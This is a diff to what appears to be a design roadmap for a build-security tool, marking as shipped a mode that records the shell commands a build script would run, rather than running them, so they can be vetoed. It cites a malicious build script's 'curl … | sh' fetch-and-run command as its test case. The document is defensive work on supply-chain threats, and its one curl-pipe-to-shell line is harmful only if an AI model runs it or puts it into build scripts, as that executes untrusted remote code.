@@ -928,9 +928,27 @@ maybe_veto_build(repo, target, purpose):
    **Next:** layer 3 (`spawn_sandboxed`) driven by the same policy object;
    layer 1b (`--vet-tool`) is shipped. (Stopgap 2a — `.c`
    grep — no longer needed; the positive coordinate allowlist is shipped.)
-5. **Tier C spike** — the `--lib` doppelganger that records build intent
-   (`os.system`/`dep`/`link_flag`/codegen) instead of executing; the aeb-unique
-   route to "read the build's intent" with no aether change. Parallel to 2b.
+5. ~~**Tier C spike** — the `--lib` doppelganger that records build intent
+   instead of executing.~~ **SHIPPED (2026-06-10).** `aeb --trace-intent
+   [--intent-json <path>]` compiles+runs the leaf against a **doppelganger
+   `std.os`** (`lib/veto_trace_os`) whose `os.system`/`os.exec`/`os.run*`
+   **RECORD** the command to a trace file instead of **EXECUTING** it, then
+   emits the recorded intent as JSON (`{"system":[…],"exec":[…],"run":[…]}`).
+   The Action!/`--lib` trick, realized with **no aether change and no SDK
+   edits**: `std.os` is the *universal shell-out chokepoint* — every SDK
+   (gcc/javac/cargo/curl) routes through it, so one shadowed lib captures the
+   whole build's intent. (`tools/aeb-trace` stages the doppelganger `std/`,
+   `transform-ae`s the `aeb(cap)` node, wraps it in a `main()` harness, and
+   compiles with a **cwd-local `--lib .`** — the only form that shadows the
+   builtin stdlib.) Live-verified: an evil `.build.ae` doing `os.system("curl
+   …| sh")` → the curl is **recorded, not run** (no exfil), the JSON drives a
+   `--vet-tool` veto. **Honest limits (as designed):** orchestration only
+   (never the compiled app), ONE path (the branch this run takes), opaque
+   computation records `<computed>` (treat opacity as a vetoable signal). A
+   strong veto INPUT for build-grammar escapes, complementary to 2b's
+   AST/symbol view — not a soundness proof. **Next:** record `dep`/`link_flag`/
+   `std.net` categories too (currently captures the `os.*` shell-out surface);
+   full orchestrator integration so a whole-tree `--trace-intent` walks the DAG.
 6. ~~**Tier B** — a `--resolve-only`/meta-emit mode exposing the resolved
    coordinate closure to a CVE/banned-dep veto without a full build.~~
    **SHIPPED (2026-06-10, maven slice).** `aeb --resolve-only [--sbom-json
